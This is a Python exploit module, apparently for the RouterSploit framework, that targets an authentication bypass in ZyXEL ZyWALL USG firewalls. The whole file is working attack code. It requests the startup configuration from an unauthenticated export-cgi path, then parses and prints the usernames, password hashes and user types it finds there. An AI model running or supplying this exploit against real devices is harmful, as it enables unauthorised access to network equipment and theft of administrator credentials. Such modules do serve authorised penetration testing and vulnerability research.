# rsf exploit module
# description: Exploit implementation for ZyWall USG 20 Authentication Bypass In Configuration Import/Export. If the target is vulnerable it allows to download configuration files which contain sensitive data like password hashes.

import requests
import re

class Exploit:
    __info__ = {
        "name": "Zyxel ZyWALL USG Extract Hashes",
        "description": "Exploit implementation for ZyWall USG 20 Authentication Bypass In Configuration Import/Export. If the target is vulnerable it allows to download configuration files which contain sensitive data like password hashes.",
        "authors": ("RedTeam Pentesting",),
        "references": ("https://www.exploit-db.com/exploits/17244/",),
        "devices": (
            "ZyXEL ZyWALL USG-20", "ZyXEL ZyWALL USG-20W", "ZyXEL ZyWALL USG-50",
            "ZyXEL ZyWALL USG-100", "ZyXEL ZyWALL USG-200", "ZyXEL ZyWALL USG-300",
            "ZyXEL ZyWALL USG-1000", "ZyXEL ZyWALL USG-1050", "ZyXEL ZyWALL USG-2000",
        ),
    }

    def __init__(self, target, port=443, ssl=True):
        self.target = target
        self.port = port
        self.ssl = ssl
        self.credentials = []

    def run(self):
        if self.check():
            print("Target appears to be vulnerable")
            print("Credentials found: ", self.credentials)
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def check(self):
        path = f"/cgi-bin/export-cgi/images/?category=config&arg0=startup-config.conf"
        response = requests.get(f'https://{self.target}:{self.port}{path}')
        if response.status_code == 200:
            for line in response.text.split("\n"):
                line = line.strip()
                m_groups = re.match(r"username (.*) password (.*) user-type (.*)", line)
                if m_groups:
                    self.credentials.append((m_groups.group(1), m_groups.group(2), m_groups.group(3)))
            if self.credentials:
                return True
        return False

